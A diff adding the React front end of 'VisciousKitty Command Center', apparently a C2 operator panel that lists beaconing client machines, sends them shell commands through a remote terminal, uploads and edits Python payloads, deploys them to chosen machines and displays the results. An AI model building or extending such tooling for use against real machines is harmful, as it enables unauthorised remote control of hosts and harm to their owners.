@@ -1,0 +1,615 @@
+import './App.css';
+import { useEffect, useState, useCallback } from 'react'
+
+const SERVER = 'http://127.0.0.1:8000'
+
+function usePolling(fn, ms = 5000) {
+  useEffect(() => {
+    let mounted = true
+    let handle = null
+    const run = async () => {
+      if (!mounted) return
+      try { await fn() } catch (e) { /* ignore */ }
+      handle = setTimeout(run, ms)
+    }
+    run()
+    return () => { mounted = false; if (handle) clearTimeout(handle) }
+  }, [fn, ms])
+}
+
+function formatAgo(epochSeconds){
+  if (!epochSeconds) return '-'
+  const delta = Date.now()/1000 - epochSeconds
+  if (delta < 2) return 'just now'
+  if (delta < 60) return `${Math.round(delta)}s ago`
+  if (delta < 3600) return `${Math.round(delta/60)}m ago`
+  if (delta < 86400) return `${Math.round(delta/3600)}h ago`
+  return `${Math.round(delta/86400)}d ago`
+}
+
+function genId(){
+  return Date.now().toString(36) + '-' + Math.random().toString(36).slice(2,10)
+}
+
+// Poll the server for a result matching a task_id for a given machine.
+// Calls `onFound(resultRecord)` when a matching result is discovered.
+function watchForResult(taskId, machineId, onFound, intervalMs = 1500, timeoutMs = 120000){
+  let stopped = false
+  let iv = null
+  let to = null
+  const stop = () => { stopped = true; if(iv) clearInterval(iv); if(to) clearTimeout(to) }
+
+  const check = async () => {
+    if (stopped) return
+    try{
+      const r = await fetch(SERVER + '/results?machine_id=' + encodeURIComponent(machineId))
+      const d = await r.json()
+      const list = d.results || []
+      const found = list.find(x => x.task_id === taskId)
+      if (found) {
+        stop()
+        try{ onFound(found) }catch(e){ console.error(e) }
+      }
+    }catch(e){ /* ignore transient errors */ }
+  }
+
+  // run immediately then at interval
+  check()
+  iv = setInterval(check, intervalMs)
+  to = setTimeout(() => { stop(); }, timeoutMs)
+  return stop
+}
+function Header({clients, tasks}){
+  return (
+    <div className="headerRow">
+      <div>
+        <div style={{display:'flex', alignItems:'center', gap:12}}>
+          <div className="badge">🚀</div>
+          <div>
+            <h2 style={{margin:0}}>VisciousKitty Command Center</h2>
+            <div className="muted">Dark-space control panel</div>
+          </div>
+        </div>
+      </div>
+      <div style={{display:'flex', gap:10}}>
+        <div className='statusPill'>{clients} clients online</div>
+        <div className='statusPill' style={{background:'linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01))'}}>{tasks} tasks pending</div>
+      </div>
+    </div>
+  )
+}
+
+function SmallCard({title, value, children}){
+  return (
+    <div className='card'>
+      <h3>{title}</h3>
+      <div style={{display:'flex', alignItems:'center', justifyContent:'space-between'}}>
+        <div className='count'>{value}</div>
+        <div style={{textAlign:'right'}} className='small'>{children}</div>
+      </div>
+    </div>
+  )
+}
+
+function App(){
+  const [tab, setTab] = useState('dashboard')
+  const [selectedMachine, setSelectedMachine] = useState(null)
+  const [clients, setClients] = useState([])
+  const [tasksCount, setTasksCount] = useState(0)
+  const [clientsCount, setClientsCount] = useState(0)
+  const [payloads, setPayloads] = useState([])
+  const [pollMs, setPollMs] = useState(() => {
+    try{ const v = localStorage.getItem('vk_poll_ms'); return v ? parseInt(v,10) : 10000 }catch{ return 10000 }
+  })
+  const [reduceMotion, setReduceMotion] = useState(() => {
+    try{ return localStorage.getItem('vk_reduce_motion') === '1' }catch{ return false }
+  })
+
+  // FIXED — stable callback (this prevents infinite polling spawns)
+  const fetchCounts = useCallback(async () => {
+    try{
+      const cs = await (await fetch(SERVER + '/clients_status')).json()
+      const mapping = cs.clients_status || {}
+      setClients(Object.entries(mapping).map(([id, info]) => ({id, ...info})))
+      setClientsCount(Object.keys(mapping).length)
+
+      try{
+        const rt = await fetch(SERVER + '/tasks_count')
+        const dt = await rt.json()
+        setTasksCount(dt.count || 0)
+      }catch(e){ setTasksCount(0) }
+    }catch(e){ /* ignore */ }
+  }, [])
+
+  // FIXED — stable callback
+  const loadPayloads = useCallback(async () => {
+    try{
+      const r = await fetch(SERVER + '/payloads')
+      const d = await r.json()
+      setPayloads(d.payloads || [])
+    }catch(e){ /* ignore */ }
+  }, [])
+
+  // Polling uses a configurable interval
+  usePolling(fetchCounts, pollMs)
+
+  useEffect(() => { fetchCounts(); loadPayloads() }, [fetchCounts, loadPayloads])
+  useEffect(() => { try{ localStorage.setItem('vk_poll_ms', String(pollMs)) }catch(e){} }, [pollMs])
+  useEffect(() => { if (reduceMotion) document.documentElement.classList.add('reduced-motion'); else document.documentElement.classList.remove('reduced-motion'); try{ localStorage.setItem('vk_reduce_motion', reduceMotion ? '1':'0') }catch(e){} }, [reduceMotion])
+
+  return (
+    <div className="App">
+      <div className="stars" />
+      <div className="nebula" />
+      <div className='container'>
+        <aside className='sidebar'>
+          <div className='logo'>
+            <div className='badge'>VK</div>
+            <div>
+              <h1>VisciousKitty</h1>
+              <div className='muted'>fleet control</div>
+            </div>
+          </div>
+
+          <div style={{height:8}} />
+          <div style={{display:'flex', gap:8, marginBottom:12}}>
+            <div className='statusPill'>Dark mode</div>
+            <div className='statusPill' style={{color:'#fff', background:'transparent', border:'1px solid rgba(255,255,255,0.03)'}}>v0.1</div>
+          </div>
+
+          <div className='nav'>
+            <button className={tab==='dashboard'? 'active':''} onClick={()=>setTab('dashboard')}>Dashboard</button>
+            <button className={tab==='clients'? 'active':''} onClick={()=>setTab('clients')}>Clients</button>
+            <button className={tab==='tasks'? 'active':''} onClick={()=>setTab('tasks')}>Tasks</button>
+            <button className={tab==='payloads'? 'active':''} onClick={()=>setTab('payloads')}>Payloads</button>
+            <button className={tab==='results'? 'active':''} onClick={()=>setTab('results')}>Results</button>
+            <div style={{height:6}}></div>
+            <button className={tab==='customize'? 'active':''} onClick={()=>setTab('customize')}>Customize</button>
+            <button className={tab==='settings'? 'active':''} onClick={()=>setTab('settings')}>Settings</button>
+          </div>
+        </aside>
+
+        <main className='main'>
+          <Header clients={clientsCount} tasks={tasksCount} />
+
+          {tab === 'dashboard' && (
+            <div className="panel">
+              <div className='grid'>
+                <SmallCard title='Clients online' value={clientsCount}>Active machines reporting</SmallCard>
+                <SmallCard title='Pending tasks' value={tasksCount}>Tasks queued for clients</SmallCard>
+                <SmallCard title='Payloads' value={'payloads'}>Upload & deploy python payloads</SmallCard>
+                <SmallCard title='Results' value={'stored'}>Persistent results DB</SmallCard>
+              </div>
+
+              <div style={{marginTop:18}} className='card'>
+                <h3>Recent Clients</h3>
+                <div style={{marginTop:8}}>
+                  <table className='table'>
+                    <thead><tr><th>machine_id</th><th>last seen</th><th>sleeping_in(s)</th><th>has_task</th><th>actions</th></tr></thead>
+                    <tbody>
+                      {clients.slice(0,6).map(c => (
+                        <tr key={c.id} className='rowClickable' onClick={() => { setSelectedMachine(c.id); setTab('machine') }}>
+                          <td style={{maxWidth:380}}>{c.id}</td>
+                          <td>{c.last_seen? formatAgo(c.last_seen): '-'}</td>
+                          <td>{c.secs_until ?? '-'}</td>
+                          <td>{String(c.has_task)}</td>
+                          <td><SendPayloadInline server={SERVER} target={c.id} payloads={payloads} /></td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {tab === 'clients' && <div className="panel"><ClientsPanel server={SERVER} payloads={payloads} onOpenMachine={(id)=>{ setSelectedMachine(id); setTab('machine') }} /></div>}
+          {tab === 'tasks' && <div className="panel"><TasksPanel server={SERVER} /></div>}
+          {tab === 'payloads' && <div className="panel"><PayloadsPanel server={SERVER} payloads={payloads} setPayloads={setPayloads} /></div>}
+          {tab === 'results' && <div className="panel"><ResultsPanel server={SERVER} /></div>}
+          {tab === 'machine' && selectedMachine && <div className="panel"><MachinePanel server={SERVER} machineId={selectedMachine} payloads={payloads} /></div>}
+          {tab === 'customize' && <div className="panel"><CustomizePanel /></div>}
+          {tab === 'settings' && <div className="panel"><SettingsPanel /></div>}
+
+          <div className='footer'>Made with ❤️ in the void — VisciousKitty</div>
+        </main>
+      </div>
+    </div>
+  )
+}
+
+/* ---------------------- OTHER COMPONENTS (unchanged) ---------------------- */
+
+function ClientsPanel({server, payloads=[]}){
+  const [items, setItems] = useState([])
+  useEffect(()=>{ (async ()=>{ try{ const r=await fetch(server + '/clients_status'); const d=await r.json(); setItems(Object.entries(d.clients_status||{}).map(([id,s]) => ({id, ...s}))) }catch(e){} })() }, [server])
+  return (
+    <div>
+      <h3>Clients</h3>
+      <div className='card' style={{marginTop:8}}>
+        <table className='table'><thead><tr><th>#</th><th>machine_id</th><th>last_seen</th><th>sleeping_in(s)</th><th>has_task</th><th>actions</th></tr></thead>
+        <tbody>
+        {items.map((c,i)=> <tr key={c.id} className='rowClickable' onClick={()=>{ if(typeof arguments[0] === 'object'){} }}><td>{i+1}</td><td style={{maxWidth:560}}>{c.id}</td><td>{c.last_seen? formatAgo(c.last_seen) : '-'}</td><td>{c.secs_until ?? '-'}</td><td>{String(c.has_task)}</td><td><SendPayloadInline server={server} target={c.id} payloads={payloads} /></td></tr>)}
+        </tbody></table>
+      </div>
+    </div>
+  )
+}
+
+function SendPayloadInline({server=SERVER, target, payloads = []}){
+  const [open, setOpen] = useState(false)
+  const [sel, setSel] = useState('')
+  const [loading, setLoading] = useState(false)
+
+  const send = async () =>{
+    if(!sel) return
+    setLoading(true)
+    try{
+      const id = genId()
+      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=PAYLOAD&machine_id=${encodeURIComponent(target)}&command=${encodeURIComponent(sel)}`
+      const r = await fetch(url, {method:'POST'})
+      if(!r.ok) console.error('send payload failed', r.status)
+      setOpen(false)
+      setSel('')
+    }catch(e){ console.error(e) }
+    setLoading(false)
+  }
+
+  return (
+    <div style={{display:'flex', gap:8, alignItems:'center'}}>
+      {!open && <button className='btn btn--fancy' style={{padding:'6px 8px', fontSize:12}} onClick={(e)=>{ e.stopPropagation(); setOpen(true)}}>Send payload</button>}
+      {open && (
+        <div style={{display:'flex', gap:8, alignItems:'center'}} className='inlineForm' onClick={e => e.stopPropagation()}>
+          <select value={sel} onChange={e=>setSel(e.target.value)} className='payloadSelect'>
+            <option value=''>-- pick payload --</option>
+            {payloads.map(p => <option key={p.id} value={p.file_name}>{p.file_name}</option>)}
+          </select>
+          <button className='btn btn--fancy' onClick={(e)=>{ e.stopPropagation(); send() }} disabled={loading || !sel} style={{padding:'6px 10px'}}>{loading? 'Sending...' : 'Send'}</button>
+          <button className='btn' onClick={(e)=>{ e.stopPropagation(); setOpen(false); setSel('') }} style={{padding:'6px 10px', background:'transparent', color:'var(--muted)', border:'1px solid rgba(255,255,255,0.03)'}}>Cancel</button>
+        </div>
+      )}
+    </div>
+  )
+}
+
+function TasksPanel({server}){
+  const [target, setTarget] = useState('')
+  const [tasks, setTasks] = useState([])
+  const load = async (t)=>{
+    if(!t) return
+    try{ const r = await fetch(server + '/tasks?short_id=' + encodeURIComponent(t)); const d = await r.json(); setTasks(d.tasks || []) }catch(e){ setTasks([{error: String(e)}]) }
+  }
+  return (
+    <div>
+      <h3>Tasks</h3>
+      <div style={{display:'flex', gap:8, marginTop:10}}>
+        <input placeholder='short id or machine_id' value={target} onChange={e=>setTarget(e.target.value)} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent', color:'inherit'}} />
+        <button className='btn' onClick={()=>load(target)}>Load</button>
+      </div>
+      <div className='card' style={{marginTop:12}}>
+        <table className='table'><thead><tr><th>task_id</th><th>type</th><th>payload</th></tr></thead>
+        <tbody>
+          {tasks.map(t => (
+            <tr key={t.task_id}><td>{t.task_id}</td><td>{t.type}</td><td style={{maxWidth:600}}>{t.command || t.script || t.payload_name || ''}</td></tr>
+          ))}
+        </tbody></table>
+      </div>
+    </div>
+  )
+}
+
+function PayloadsPanel({server, payloads = [], setPayloads}){
+  const [list, setList] = useState(payloads || [])
+  const [file, setFile] = useState(null)
+  const [selectedPayload, setSelectedPayload] = useState(null)
+  const [payloadContent, setPayloadContent] = useState('')
+  const [machines, setMachines] = useState([])
+  const [sendTarget, setSendTarget] = useState('')
+  const [saveLoading, setSaveLoading] = useState(false)
+  const [sendLoading, setSendLoading] = useState(false)
+  const [messages, setMessages] = useState([])
+  useEffect(()=>{
+    if (payloads && payloads.length) {
+      setList(payloads)
+      return
+    }
+    (async ()=>{ try{ const r=await fetch(server + '/payloads'); const d=await r.json(); setList(d.payloads || []) }catch(e){} })()
+  }, [server, payloads])
+  useEffect(()=>{
+    // load clients so editor can target machines for deploy
+    (async ()=>{
+      try{
+        const r = await fetch(server + '/clients_status')
+        const d = await r.json()
+        const m = Object.keys(d.clients_status || {})
+        setMachines(m)
+      }catch(e){}
+    })()
+  }, [server])
+  
+  const openEditor = async (p) =>{
+    setSelectedPayload(p)
+    setPayloadContent('Loading...')
+    try{
+      const r = await fetch(server + '/payload?file_name=' + encodeURIComponent(p.file_name))
+      const d = await r.json()
+      setPayloadContent(d.content || '')
+    }catch(e){ setPayloadContent(`Error loading: ${String(e)}`) }
+  }
+
+  const closeEditor = () => { setSelectedPayload(null); setPayloadContent(''); setSendTarget('') }
+
+  const savePayload = async () =>{
+    if(!selectedPayload) return
+    setSaveLoading(true)
+    try{
+      const body = { file_name: selectedPayload.file_name, content: payloadContent }
+      const r = await fetch(server + '/upload_payload', { method: 'POST', headers: {'content-type':'application/json'}, body: JSON.stringify(body) })
+      const d = await r.json()
+      setMessages(prev => [`Saved ${selectedPayload.file_name}`, ...prev].slice(0,10))
+      // update local list and parent
+      setList(prev => prev.map(it => it.id === d.payload.id ? d.payload : it))
+      if (typeof setPayloads === 'function') setPayloads(prev => prev.map(it => it.id === d.payload.id ? d.payload : it))
+    }catch(e){ setMessages(prev => [`Save error: ${String(e)}`, ...prev].slice(0,10)) }
+    setSaveLoading(false)
+  }
+
+  const sendToMachine = async () =>{
+    if(!selectedPayload || !sendTarget) return
+    setSendLoading(true)
+    try{
+      const id = genId()
+      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=PAYLOAD&machine_id=${encodeURIComponent(sendTarget)}&command=${encodeURIComponent(selectedPayload.file_name)}`
+      const r = await fetch(url, {method:'POST'})
+      if(r.ok) setMessages(prev => [`Sent ${selectedPayload.file_name} -> ${sendTarget}`, ...prev].slice(0,10))
+      else setMessages(prev => [`Send failed: ${r.status}`, ...prev].slice(0,10))
+    }catch(e){ setMessages(prev => [`Send error: ${String(e)}`, ...prev].slice(0,10)) }
+    setSendLoading(false)
+  }
+  const upload = async () =>{
+    if(!file) return
+    try{
+      const text = await file.text()
+      const resp = await fetch(server + '/upload_payload', {method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({file_name: file.name, content: text})})
+      const d = await resp.json()
+      setList(prev => [d.payload, ...prev])
+      if (typeof setPayloads === 'function') setPayloads(prev => [d.payload, ...(prev || [])])
+    }catch(e){ console.error(e) }
+  }
+  return (
+    <div>
+      <h3>Payloads</h3>
+      <div style={{display:'flex', gap:8, alignItems:'center'}}>
+        <label className='fileControl'>
+          <input id='payload-file-input' type='file' accept='.py' onChange={e=>setFile(e.target.files && e.target.files[0])} />
+          <div className='fileName'>{file ? file.name : 'Choose a .py file...'}</div>
+        </label>
+        <label htmlFor='payload-file-input' className='filePicker'>Browse</label>
+        <button className='btn btn--fancy' onClick={upload} disabled={!file}>{file ? 'Upload' : 'Upload'}</button>
+      </div>
+      <div className='card' style={{marginTop:12}}>
+        <table className='table'><thead><tr><th>id</th><th>file_name</th><th>timestamp</th></tr></thead>
+        <tbody>
+          {list.map(p => <tr key={p.id}><td>{p.id}</td><td><button className='btn' onClick={()=>openEditor(p)} style={{background:'transparent', border:'none', color:'var(--accent)'}}>{p.file_name}</button></td><td>{new Date(p.timestamp*1000).toLocaleString()}</td></tr>)}
+        </tbody></table>
+      </div>
+      {selectedPayload && (
+        <div className='card' style={{marginTop:12}}>
+          <h3>Editing: {selectedPayload.file_name}</h3>
+          <div style={{display:'flex', gap:8, marginBottom:8}}>
+            <button className='btn btn--fancy' onClick={savePayload} disabled={saveLoading}>{saveLoading? 'Saving...':'Save'}</button>
+            <select value={sendTarget} onChange={e=>setSendTarget(e.target.value)} style={{padding:8, borderRadius:8, background:'transparent'}}>
+              <option value=''>-- send to machine --</option>
+              {machines.map(m => <option key={m} value={m}>{m}</option>)}
+            </select>
+            <button className='btn' onClick={sendToMachine} disabled={sendLoading || !sendTarget}>{sendLoading? 'Sending...':'Send'}</button>
+            <div style={{marginLeft:'auto'}}><button className='btn' onClick={closeEditor}>Close</button></div>
+          </div>
+          <textarea value={payloadContent} onChange={e=>setPayloadContent(e.target.value)} style={{width:'100%', minHeight:300, fontFamily:'ui-monospace, SFMono-Regular, Menlo, Monaco, monospace', fontSize:13, background:'rgba(0,0,0,0.6)', color:'inherit', padding:12, borderRadius:8}} />
+          <div style={{marginTop:8}}>
+            {messages.map((m,i)=> <div key={i} style={{padding:'6px 0', borderBottom:'1px dashed rgba(255,255,255,0.02)'}}>{m}</div>)}
+          </div>
+        </div>
+      )}
+    </div>
+  )
+}
+
+function ResultsPanel({server}){
+  const [target,setTarget] = useState('')
+  const [items,setItems] = useState([])
+  const [preview, setPreview] = useState(null)
+  const load = async (t) =>{
+    if(!t) return
+    try{
+      const r = await fetch(server + '/results?short_id=' + encodeURIComponent(t))
+      const d = await r.json()
+      setItems(d.results || [])
+    }catch(e){ setItems([{error: String(e)}]) }
+  }
+  const view = async (id)=>{
+    try{ const r = await fetch(server + '/result?id=' + encodeURIComponent(id)); const d = await r.json(); setPreview(d.result) }catch(e){ setPreview({error:String(e)}) }
+  }
+  return (
+    <div>
+      <h3>Results</h3>
+      <div style={{display:'flex', gap:8, marginTop:10}}>
+        <input placeholder='short id or machine_id' value={target} onChange={e=>setTarget(e.target.value)} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent', color:'inherit'}} />
+        <button className='btn' onClick={()=>load(target)}>Load</button>
+      </div>
+      <div className='card' style={{marginTop:12}}>
+        <table className='table'><thead><tr><th>id</th><th>task_id</th><th>timestamp</th><th>preview</th><th>view</th></tr></thead>
+        <tbody>
+          {items.map(r => <tr key={r.id}><td>{r.id}</td><td>{r.task_id}</td><td>{new Date(r.timestamp*1000).toLocaleString()}</td><td style={{maxWidth:600}}>{typeof r.result === 'string' ? (r.result.length>100? r.result.slice(0,100)+'...':r.result): JSON.stringify(r.result)}</td><td><button className='btn' onClick={()=>view(r.id)}>View</button></td></tr>)}
+        </tbody></table>
+      </div>
+      {preview && (
+        <div className='card' style={{marginTop:12, whiteSpace:'pre-wrap', fontFamily:'ui-monospace, SFMono-Regular, Menlo, Monaco, monospace'}}>
+          <h3>Result full view</h3>
+          <div style={{maxHeight:300, overflow:'auto'}}>{typeof preview === 'string' ? preview : JSON.stringify(preview, null, 2)}</div>
+        </div>
+      )}
+    </div>
+  )
+}
+
+function MachinePanel({server, machineId, payloads=[]}){
+  const [terminalCmd, setTerminalCmd] = useState('')
+  const [log, setLog] = useState([])
+
+  const runCmd = async () =>{
+    if(!terminalCmd) return
+    try{
+      const id = genId()
+      // send as CMD task
+      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=CMD&machine_id=${encodeURIComponent(machineId)}&command=${encodeURIComponent(terminalCmd)}`
+      const r = await fetch(url, {method:'POST'})
+      if(r.ok){
+        const waitMsg = `Waiting for result (task ${id})...`
+        setLog(prev => [`Sent: ${terminalCmd}`, waitMsg, ...prev])
+        setTerminalCmd('')
+        // poll for the result and show it when available
+        watchForResult(id, machineId, (found) => {
+          const pretty = typeof found.result === 'string' ? found.result : JSON.stringify(found.result)
+          setLog(prev => {
+            const cleaned = prev.filter(x => !x.startsWith(`Waiting for result (task ${id})`))
+            return [`Result (${id}): ${pretty}`, ...cleaned]
+          })
+        })
+      } else setLog(prev => [`Failed to send: ${r.status}`, ...prev])
+    }catch(e){ setLog(prev => [`Error: ${String(e)}`, ...prev]) }
+  }
+
+  const sendPayload = async (payloadName) =>{
+    try{
+      const id = genId()
+      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=PAYLOAD&machine_id=${encodeURIComponent(machineId)}&command=${encodeURIComponent(payloadName)}`
+      const r = await fetch(url, {method:'POST'})
+      if(r.ok){
+        const waitMsg = `Waiting for result (task ${id})...`
+        setLog(prev => [`Queued payload: ${payloadName}`, waitMsg, ...prev])
+        // poll for the result and show it when available
+        watchForResult(id, machineId, (found) => {
+          const pretty = typeof found.result === 'string' ? found.result : JSON.stringify(found.result)
+          setLog(prev => {
+            const cleaned = prev.filter(x => !x.startsWith(`Waiting for result (task ${id})`))
+            return [`Result (${id}): ${pretty}`, ...cleaned]
+          })
+        })
+      } else setLog(prev => [`Payload queue failed: ${r.status}`, ...prev])
+    }catch(e){ setLog(prev => [`Error: ${String(e)}`, ...prev]) }
+  }
+
+  return (
+    <div className='machinePanel'>
+      <div className='machineHeader'>
+        <div>
+          <h3>Machine</h3>
+          <div className='small'>{machineId}</div>
+        </div>
+        <div className='machineActions'>
+          <button className='btn' onClick={()=>{ navigator.clipboard && navigator.clipboard.writeText(machineId) }}>Copy ID</button>
+          <button className='btn' onClick={()=>{ /* TODO: remote check-in actions */ }}>Refresh</button>
+        </div>
+      </div>
+
+      <div className='card'>
+        <h4>Terminal</h4>
+        <div className='terminalBox'>
+          <input value={terminalCmd} onChange={e=>setTerminalCmd(e.target.value)} className='terminalInput' placeholder='e.g. whoami or ipconfig' />
+          <button className='btn btn--fancy' onClick={runCmd}>Run</button>
+        </div>
+        <div style={{marginTop:10}}>
+          <h5>Recent actions</h5>
+          <div style={{maxHeight:220, overflow:'auto'}}>
+            {log.map((l,i)=> <div key={i} style={{padding:'6px 0', borderBottom:'1px dashed rgba(255,255,255,0.02)'}}>{l}</div>)}
+          </div>
+        </div>
+      </div>
+
+      <div className='card'>
+        <h4>Payloads</h4>
+        <div className='payloadGrid'>
+          {payloads.map(p => <button key={p.id} className='payloadBtn' onClick={()=>sendPayload(p.file_name)}>{p.file_name}</button>)}
+        </div>
+      </div>
+    </div>
+  )
+}
+
+function CustomizePanel(){
+  const [accent, setAccent] = useState(getComputedStyle(document.documentElement).getPropertyValue('--accent')?.trim() || '#7ee7ff')
+  const [accent2, setAccent2] = useState(getComputedStyle(document.documentElement).getPropertyValue('--accent-2')?.trim() || '#9b7cff')
+  const [nebulaIntensity, setNebulaIntensity] = useState(0.9)
+
+  const apply = () =>{
+    document.documentElement.style.setProperty('--accent', accent)
+    document.documentElement.style.setProperty('--accent-2', accent2)
+    // tweak nebula blur / opacity via inline style
+    const neb = document.querySelector('.nebula')
+    if (neb) neb.style.opacity = String(Math.max(0.2, Math.min(1.0, nebulaIntensity)))
+  }
+
+  return (
+    <div>
+      <h3>Customize</h3>
+      <div className='card' style={{marginTop:8}}>
+        <div style={{display:'flex', gap:12, alignItems:'center'}}>
+          <div style={{display:'flex', flexDirection:'column', gap:8}}>
+            <label style={{fontSize:13}}>Accent</label>
+            <input type='color' value={accent} onChange={e=>setAccent(e.target.value)} />
+          </div>
+          <div style={{display:'flex', flexDirection:'column', gap:8}}>
+            <label style={{fontSize:13}}>Accent 2</label>
+            <input type='color' value={accent2} onChange={e=>setAccent2(e.target.value)} />
+          </div>
+          <div style={{display:'flex', flexDirection:'column', gap:8}}>
+            <label style={{fontSize:13}}>Nebula intensity</label>
+            <input type='range' min='0.2' max='1.4' step='0.05' value={nebulaIntensity} onChange={e=>setNebulaIntensity(e.target.value)} />
+          </div>
+          <div style={{marginLeft:'auto'}}>
+            <button className='btn btn--fancy' onClick={apply}>Apply</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  )
+}
+
+function SettingsPanel(){
+  const [value, setValue] = useState(() => { try{ return parseInt(localStorage.getItem('vk_poll_ms')||'10000',10) }catch{return 10000}})
+  const [reduce, setReduce] = useState(() => { try{ return localStorage.getItem('vk_reduce_motion') === '1' }catch{return false}})
+
+  const save = () =>{
+    try{ localStorage.setItem('vk_poll_ms', String(value)) }catch{}
+    try{ localStorage.setItem('vk_reduce_motion', reduce ? '1':'0') }catch{}
+    // reload page so main app picks up new pollMs / reduceMotion (simple approach)
+    window.location.reload()
+  }
+
+  return (
+    <div>
+      <h3>Settings</h3>
+      <div className='card' style={{marginTop:8}}>
+        <div style={{display:'flex', flexDirection:'column', gap:12}}>
+          <div style={{display:'flex', gap:10, alignItems:'center'}}>
+            <label style={{minWidth:220}}>UI polling interval (ms)</label>
+            <input type='number' value={value} onChange={e=>setValue(parseInt(e.target.value || '10000',10))} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent'}} />
+          </div>
+
+          <div style={{display:'flex', gap:10, alignItems:'center'}}>
+            <label style={{minWidth:220}}>Reduce motion (disable animations)</label>
+            <input type='checkbox' checked={reduce} onChange={e=>setReduce(Boolean(e.target.checked))} />
+          </div>
+
+          <div style={{display:'flex', gap:8, marginTop:6}}>
+            <button className='btn btn--fancy' onClick={save}>Save & Reload</button>
+            <div style={{alignSelf:'center', color:'var(--muted)', fontSize:13}}>Reload is required for some visual settings to fully apply.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  )
+}
+
+export default App;
